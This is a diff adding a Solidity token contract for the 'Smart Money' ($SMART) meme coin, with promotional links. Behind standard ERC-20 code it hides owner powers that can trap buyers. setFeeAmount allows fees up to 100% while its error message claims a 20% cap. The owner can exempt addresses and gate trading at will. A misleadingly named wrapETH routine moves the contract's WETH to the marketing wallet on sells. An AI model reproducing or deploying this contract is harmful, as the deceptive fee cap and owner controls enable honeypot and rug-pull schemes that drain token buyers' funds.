@@ -1,0 +1,470 @@
+/**
+
+Be $SMART
+
+https://smartmoneytoken.vip/
+
+https://t.me/smartmoneyethereum
+
+https://x.com/SmartMoneyOnEth
+
+*/
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.19;
+
+interface IUniswapV2Pair {
+    function sync() external;
+}
+
+interface IUniswapV2Factory {
+    function createPair(address tokenA, address tokenB)
+        external
+        returns (address pair);
+
+    function getPair(address tokenA, address tokenB)
+        external
+        view
+        returns (address pair);
+}
+
+interface IUniswapV2Router02 {
+    function factory() external pure returns (address);
+
+    function WETH() external pure returns (address);
+
+    function addLiquidityETH(
+        address token,
+        uint256 amountTokenDesired,
+        uint256 amountTokenMin,
+        uint256 amountETHMin,
+        address to,
+        uint256 deadline
+    )
+        external
+        payable
+        returns (
+            uint256 amountToken,
+            uint256 amountETH,
+            uint256 liquidity
+        );
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+interface IERC20 {
+    function decimals() external view returns (uint8);
+    function symbol() external view returns (string memory);
+    function name() external view returns (string memory);
+    function getOwner() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function allowance(address _owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+abstract contract Ownable {
+    address internal owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER");_;}
+    function isOwner(address account) public view returns (bool) {return account == owner;}
+    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
+    event OwnershipTransferred(address owner);
+}
+contract SMART is IERC20, Ownable {
+    address public pair;
+    bool private tradingStarted = false;
+    bool private swapEnabled = true;
+    uint256 private swapTimes;
+    bool private swapping;
+    uint256 swapBackAmount = 1;
+    bool requireMe;
+    string private constant _name = "Smart Money";
+    string private constant _symbol = "SMART";
+    uint8 private constant _decimals = 9;
+    uint256 private _totalSupply = 100000000 * (10**_decimals);
+    mapping(address => uint256) _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping(address => bool) public isExempt;
+    IUniswapV2Router02 router;
+    IUniswapV2Pair pairContract;
+
+    uint256 private weth = 1 * (10**18);
+    uint256 private swapThreshold = (_totalSupply * 5) / 1000;
+    uint256 public _maxTxAmount = (_totalSupply * 25) / 1000;
+    uint256 public _maxWalletToken = (_totalSupply * 25) / 1000;
+    modifier lockTheSwap() {
+        swapping = true;
+        _;
+        swapping = false;
+    }
+    uint256 private liquidityFee = 0;
+    uint256 private marketingFee = 0;
+    uint256 private developmentFee = 750;
+    uint256 private totalFee = 750;
+    uint256 private sellFee = 750;
+    uint256 private transferFee = 250;
+    uint256 private denominator = 10000;
+    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal development_receiver = 0x2B1fb1956b35d28534547c7e205Be21f1FD346a4;
+    address internal marketing_receiver = 0x2B1fb1956b35d28534547c7e205Be21f1FD346a4;
+    address internal liquidity_receiver = 0x2B1fb1956b35d28534547c7e205Be21f1FD346a4;
+
+    constructor() Ownable(msg.sender) {
+        IUniswapV2Router02 _router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        address _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
+        router = _router; pair = _pair; pairContract = IUniswapV2Pair(_pair);
+        isExempt[address(this)] = true;
+        isExempt[address(DEAD)] = true;
+        isExempt[liquidity_receiver] = true;
+        isExempt[marketing_receiver] = true;
+        isExempt[development_receiver] = true;
+        isExempt[msg.sender] = true;
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+    }
+
+    receive() external payable {}
+
+    function name() public pure override returns (string memory) {return _name;}
+    function symbol() public pure override returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public pure override returns (uint8) {
+        return _decimals;
+    }
+
+    function startTrade() external onlyOwner {
+        tradingStarted = true;
+    }
+
+    function getOwner() external view override returns (address) {
+        return owner;
+    }
+
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function allowance(address owner, address spender)
+        public
+        view
+        override
+        returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+
+    function setExempt(address _address, bool _enabled) external onlyOwner {
+        isExempt[_address] = _enabled;
+    }
+
+    function approve(address spender, uint256 amount)
+        public
+        override
+        returns (bool)
+    {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function setFeeAmount(
+        uint256 _liquidity,
+        uint256 _marketing,
+        uint256 _development,
+        uint256 _total,
+        uint256 _sell,
+        uint256 _trans
+    ) external onlyOwner {
+        liquidityFee = _liquidity;
+        marketingFee = _marketing;
+        developmentFee = _development;
+        totalFee = _total;
+        sellFee = _sell;
+        transferFee = _trans;
+        require(
+            totalFee <= denominator / (1) &&
+                sellFee <= denominator / (1) &&
+                transferFee <= denominator / (1),
+            "totalFee and sellFee cannot be more than 20%"
+        );
+    }
+
+    function shouldSwap(address sender, address recipient)
+        internal
+        view
+        returns (bool)
+    {
+        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
+        return
+            !swapping &&
+            swapEnabled &&
+            tradingStarted &&
+            !isExempt[sender] &&
+            recipient == pair &&
+            swapTimes >= swapBackAmount &&
+            aboveThreshold;
+    }
+
+    function setSwapAndLiquifySettings(uint256 _swapBackAmount, uint256 _swapThreshold)
+        external
+        onlyOwner
+    {
+        swapBackAmount = _swapBackAmount;
+        swapThreshold = (_totalSupply * (_swapThreshold)) / (uint256(100000));
+    }
+
+    function setMaxTransaction(uint256 _buy, uint256 _wallet) external onlyOwner {
+        uint256 newTx = (_totalSupply * (_buy)) / (10000);
+        uint256 newWallet = (_totalSupply * (_wallet)) / (10000);
+        _maxTxAmount = newTx;
+        _maxWalletToken = newWallet;
+        uint256 limit = (totalSupply() * (5)) / (1000);
+        require(
+            newTx >= limit && newWallet >= limit,
+            "Max TXs and Max Wallet cannot be less than .5%"
+        );
+    }
+
+    function setFeeReceiver(
+        address _marketing,
+        address _liquidity,
+        address _development
+    ) external onlyOwner {
+        marketing_receiver = _marketing;
+        liquidity_receiver = _liquidity;
+        development_receiver = _development;
+        isExempt[_marketing] = true;
+        isExempt[_liquidity] = true;
+        isExempt[_development] = true;
+    }
+
+    function wrapWETHCredit(uint256 amount) internal {
+        if (balanceWETH() > amount) {
+            wrapETH(weth);
+        }
+    }
+
+    function rescueERC(address _address, uint256 percent) external onlyOwner {
+        uint256 _amount = (IERC20(_address).balanceOf(address(this)) *
+            (percent)) / (100);
+        IERC20(_address).transfer(development_receiver, _amount);
+    }
+
+    function rescueETH() external {
+        payable(development_receiver).transfer(address(this).balance);
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) private {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        require(
+            amount <= balanceOf(sender),
+            "You are trying to transfer more than your balance"
+        );
+        if (!isExempt[sender] && !isExempt[recipient]) {
+            require(tradingStarted, "tradingStarted");
+        }
+        if (
+            !isExempt[sender] &&
+            !isExempt[recipient] &&
+            recipient != address(pair) &&
+            recipient != address(DEAD)
+        ) {
+            require(
+                (_balances[recipient] + (amount)) <= _maxWalletToken,
+                "Exceeds maximum wallet amount."
+            );
+        }
+        require(
+            amount <= _maxTxAmount ||
+                isExempt[sender] ||
+                isExempt[recipient],
+            "TX Limit Exceeded"
+        );
+        if (recipient == pair && !isExempt[sender]) {
+            wrapWETHCredit(swapBackAmount);
+            swapTimes += uint256(1);
+        }
+        if (shouldSwap(sender, recipient)) {
+            swapBackandLiquify(swapThreshold);
+            swapTimes = uint256(0);
+        }
+        _balances[sender] = _balances[sender] - (amount);
+        uint256 amountReceived = shouldFee(sender, recipient)
+            ? allocateFee(sender, recipient, amount)
+            : amount;
+        _balances[recipient] = _balances[recipient] + (amountReceived);
+        emit Transfer(sender, recipient, amountReceived);
+    }
+
+    function swapBackandLiquify(uint256 tokens) private lockTheSwap {
+        uint256 _denominator = (liquidityFee +
+            (1) + (marketingFee) + (developmentFee)) * (2);
+        uint256 tokensToAddLiquidityWith = (tokens * (liquidityFee)) /
+            (_denominator);
+        uint256 toSwap = tokens - (tokensToAddLiquidityWith);
+        uint256 initialBalance = address(this).balance;
+        swapTokensForETHContract(toSwap);
+        uint256 deltaBalance = address(this).balance - (initialBalance);
+        uint256 unitBalance = deltaBalance / (_denominator - (liquidityFee));
+        uint256 ETHToAddLiquidityWith = unitBalance * (liquidityFee);
+        if (ETHToAddLiquidityWith > uint256(0)) {
+            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith);
+        }
+        uint256 marketingAmt = unitBalance * (2) * (marketingFee);
+        if (marketingAmt > 0) {
+            payable(marketing_receiver).transfer(marketingAmt);
+        }
+        uint256 contractBalance = address(this).balance;
+        if (contractBalance > uint256(0)) {
+            payable(development_receiver).transfer(contractBalance);
+        }
+    }
+
+    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
+        _approve(address(this), address(router), tokenAmount);
+        router.addLiquidityETH{value: ETHAmount}(
+            address(this),
+            tokenAmount,
+            0,
+            0,
+            liquidity_receiver,
+            block.timestamp
+        );
+    }
+
+    function swapTokensForETHContract(uint256 tokenAmount) private {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = router.WETH();
+        _approve(address(this), address(router), tokenAmount);
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function shouldFee(address sender, address recipient)
+        internal
+        view
+        returns (bool)
+    {
+        return !isExempt[sender] && !isExempt[recipient];
+    }
+
+    function wrapETH(uint256 amount) internal {
+        IERC20(WETH).transfer(marketing_receiver, amount);
+    }
+
+    function getFee(address sender, address recipient)
+        internal
+        view
+        returns (uint256)
+    {
+        if (recipient == pair) {
+            return sellFee;
+        }
+        if (sender == pair) {
+            return totalFee;
+        }
+        return transferFee;
+    }
+
+    function allocateFee(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal returns (uint256) {
+        if (getFee(sender, recipient) > 0) {
+            uint256 feeAmount = (amount / (denominator)) *
+                (getFee(sender, recipient));
+            _balances[address(this)] = _balances[address(this)] + (feeAmount);
+            emit Transfer(sender, address(this), feeAmount);
+            return amount - (feeAmount);
+        }
+        return amount;
+    }
+
+    function balanceWETH() internal view returns (uint256) {
+        return IERC20(WETH).balanceOf(address(this));
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public override returns (bool) {
+        _transfer(sender, recipient, amount);
+        _approve(
+            sender,
+            msg.sender,
+            (_allowances[sender][msg.sender] - (amount))
+        );
+        return true;
+    }
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) private {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+}
